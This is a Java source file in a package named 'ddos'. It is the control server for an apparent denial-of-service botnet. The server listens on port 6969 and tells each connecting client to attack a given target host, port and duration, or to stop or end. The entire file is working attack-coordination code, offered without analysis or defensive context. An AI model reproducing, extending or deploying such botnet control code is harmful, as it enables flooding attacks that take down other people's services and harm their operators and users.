package ddos;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Random;

public class server implements Runnable {
	protected String host;
	protected int time, port;
	boolean end = false;
	Random ran = new Random();
	boolean stop = true, run = true;
	ServerSocket s;
	int pid = 0;

	public void run() {
		try {
			s = new ServerSocket(6969);
			do {
				Socket c = s.accept();
				//System.out.println(c.getPort());
				// if (stop)
				// new Thread(new send(c)).start();
				// else
				// new Thread(new send(host, port, time, c)).start();
				if (end)
					sendC(c);
				else if (stop)
					sendB(c);
				else
					sendA(c);
				c.close();

			} while (run);
			s.close();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void sendC(Socket c) throws IOException {
		// TODO Auto-generated method stub
		DataOutputStream out = new DataOutputStream(c.getOutputStream());
		out.writeUTF("end");
		out.flush();
	}

	void set(String lhost, int ltime, int lport) {
		host = lhost;
		time = ltime;
		port = lport;
		stop = false;
		pid = newpid();
	}

	protected void stop() {
		stop = true;
	}

	protected void end() {
		run = false;
	}

	private void sendA(Socket s) throws Exception {
		// TODO Auto-generated method stub
		DataOutputStream out = new DataOutputStream(s.getOutputStream());
		out.writeUTF("attack");
		out.writeUTF(host);
		out.writeInt(port);
		out.writeInt(time);
		out.writeInt(pid);
		out.flush();
		// out.close();
		// s.close();
	}

	private void sendB(Socket s) throws IOException {
		// TODO Auto-generated method stub
		DataOutputStream out = new DataOutputStream(s.getOutputStream());
		out.writeUTF("stop");
		out.flush();
		// s.close();
	}

	static int newpid() {
		return (int) (Math.random() * 100000);
	}
}
